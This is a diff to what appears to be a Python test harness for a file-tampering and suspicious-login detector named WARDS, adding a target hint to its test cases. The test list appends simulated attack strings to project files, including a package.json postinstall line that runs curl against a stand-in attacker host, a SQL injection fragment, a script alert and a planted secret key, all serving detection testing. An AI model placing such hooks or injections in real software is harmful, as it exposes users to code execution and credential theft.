@@ -28,6 +28,7 @@ def file_attack(test_id: str, scenario: str, path: str, payload: str) -> TestCas
         lambda p=path, text=payload: (vm1_backup(p), vm1_append(p, text)),
         trigger_scan=True,
         cleanup=lambda p=path: vm1_restore(p),
+        target_hint=path,
     )
 
 
@@ -40,6 +41,7 @@ def file_delete_attack(test_id: str, scenario: str, path: str) -> TestCase:
         lambda p=path: (vm1_backup(p), vm1_delete(p)),
         trigger_scan=True,
         cleanup=lambda p=path: vm1_restore(p),
+        target_hint=path,
     )
 
 
@@ -52,15 +54,16 @@ def benign_file(test_id: str, scenario: str, path: str, payload: str) -> TestCas
         lambda p=path, text=payload: (vm1_backup(p), vm1_append(p, text)),
         trigger_scan=True,
         cleanup=lambda p=path: vm1_restore(p),
+        target_hint=path,
     )
 
 
 def context_case(test_id: str, scenario: str, actual: str, change_type: str, context: dict) -> TestCase:
-    return TestCase(test_id, scenario, "context", actual, lambda: context_detection(test_id, change_type, context), wait_seconds=0)
+    return TestCase(test_id, scenario, "context", actual, lambda: context_detection(test_id, change_type, context), wait_seconds=0, target_hint=f"evaluation:{test_id}")
 
 
 def context_domain_case(test_id: str, scenario: str, domain: str, actual: str, change_type: str, context: dict) -> TestCase:
-    return TestCase(test_id, scenario, domain, actual, lambda: context_detection(test_id, change_type, context), wait_seconds=0)
+    return TestCase(test_id, scenario, domain, actual, lambda: context_detection(test_id, change_type, context), wait_seconds=0, target_hint=f"evaluation:{test_id}")
 
 
 def all_tests() -> list[TestCase]:
@@ -73,7 +76,7 @@ def all_tests() -> list[TestCase]:
         file_attack("ATK-F-06", "TypeScript injection", "WARDS/frontend/src/services/api.js", "\nwindow.onload=function(){alert('owned')}\n"),
         file_attack("ATK-F-07", "CSS defacement", "WARDS/frontend/src/index.css", "\nbody:before{content:'DEFACED'}\n"),
         file_attack("ATK-F-08", "Config tampering .env.example", "WARDS/backend/.env.example", "\nSECRET_KEY=attacker_controlled\n"),
-        file_attack("ATK-F-09", "Defacement keyword in README", "README.md", "\nThis system was defaced during evaluation.\n"),
+        file_attack("ATK-F-09", "Defacement keyword in README", "WARDS/backend/README.md", "\nThis system was defaced during evaluation.\n"),
         file_attack("ATK-F-10", "Deployment config poisoning", "WARDS/frontend/package.json", "\n\"postinstall\":\"curl http://attacker.invalid/payload\",\n"),
         file_attack("ATK-F-11", "SQL keyword in CSV", "WARDS/backend/data/eval.csv", "\n1,union select password from admins\n"),
         file_attack("ATK-F-12", "Credential exposure in text", "WARDS/backend/requirements.txt", "\npassword=attacker_controlled\n"),
@@ -110,7 +113,7 @@ def all_tests() -> list[TestCase]:
         context_case("ATK-CTX-08", "Impossible travel", "attack", "suspicious_login", {"geo_distance_from_last_login_km": 8000, "hours_since_last_login": 2}),
         context_case("ATK-CTX-09", "Session context drift", "attack", "suspicious_login", {"session_context_anomaly": True, "active_session_replaced": True}),
         context_case("ATK-CTX-10", "Keystroke paste anomaly", "attack", "suspicious_login", {"pasted_password": True, "keystroke_dynamics_available": False}),
-        benign_file("BEN-F-01", "README timestamp append", "README.md", "\nEvaluation timestamp note.\n"),
+        benign_file("BEN-F-01", "README timestamp append", "WARDS/backend/README.md", "\nEvaluation timestamp note.\n"),
         benign_file("BEN-F-02", "Requirements comment", "WARDS/backend/requirements.txt", "\n# benign evaluation note\n"),
         benign_file("BEN-F-03", "Operational log note", "WARDS/backend/README.md", "\nBenign operational log note.\n"),
         benign_file("BEN-F-04", "Temporary cache note", "WARDS/backend/requirements.txt", "\n# benign cache note\n"),
